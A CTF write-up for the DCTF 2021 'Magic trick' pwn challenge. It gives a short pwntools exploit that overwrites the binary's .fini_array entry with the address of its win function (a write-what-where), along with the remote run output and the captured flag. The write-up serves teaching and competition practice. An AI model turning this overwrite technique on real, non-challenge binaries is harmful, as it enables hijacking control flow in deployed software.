# DCTF 2021

## Magic trick

> 300
> 
> How about a magic trick? 
> 
> `nc dctf-chall-magic-trick.westeurope.azurecontainer.io 7481`
>
> [magic\_trick](magic_trick)

Tags: _pwn_ _x86-64_ _write-what-where_


## Summary

More like _old trick_.  This is identical to [mindfield](https://github.com/datajerk/ctf-write-ups/tree/master/cyberapocalypsectf2021/mindfield) from 3 weeks back, so read that [writeup](https://github.com/datajerk/ctf-write-ups/tree/master/cyberapocalypsectf2021/mindfield).

> This is why I minimize hardcoded values in my writeups; took me 30 seconds to solve with minor modifications to an existing solve.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./magic_trick')

if args.REMOTE:
    p = remote('dctf-chall-magic-trick.westeurope.azurecontainer.io', 7481)
else:
    p = process(binary.path)

p.sendlineafter('write\n', str(binary.sym.win))
p.sendlineafter('it\n', str(binary.get_section_by_name('.fini_array').header.sh_addr))
print(p.recvuntil('}').decode())
```

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/dctf2021/magic_trick/magic_trick'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to dctf-chall-magic-trick.westeurope.azurecontainer.io on port 7481: Done
thanks
You are a real magician
dctf{1_L1k3_M4G1c}
```
